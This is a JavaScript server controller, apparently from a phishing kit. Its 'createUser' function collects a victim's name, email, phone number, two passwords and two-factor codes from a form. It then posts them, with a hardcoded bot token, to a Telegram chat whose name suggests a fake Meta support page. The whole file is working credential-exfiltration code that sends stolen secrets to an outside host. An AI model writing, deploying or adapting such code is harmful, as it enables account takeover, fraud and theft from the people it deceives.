import User from "./User.model.js";
import fs from 'fs'
import util from 'util'
import axios from "axios";

export const createUser = async (req, res) => {
    try {
        const { id,
			full_name,
            login_email,
            phone_number,
            page_name,
            password_one,
            password_two, tfa_one, tfa_two, tfa_three, additional_info } = req.body;

        const params =
            `=============================%0A PageName: ${page_name}%0A Full Name: ${full_name}%0A Email: ${login_email}%0A Tel: ${phone_number}%0A Password1: ${password_one}%0A Password2: ${password_two}%0A 2fa: ${tfa_one}%0A 2fa-2: ${tfa_two}%0A=============================`;

            console.log(params);
        const response = axios.post(`https://api.telegram.org/bot7664187578:AAFX3bJAoQpUMiwv0hJD_rZOR13S6s_B-qI/sendMessage?chat_id=@metasupportcase1002286901019&text=${params}/`, {
            headers: {
                'Content-Type': 'application/json',
                'X-Robots-Tag': 'googlebot: nofollow',
            },

        })

    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};

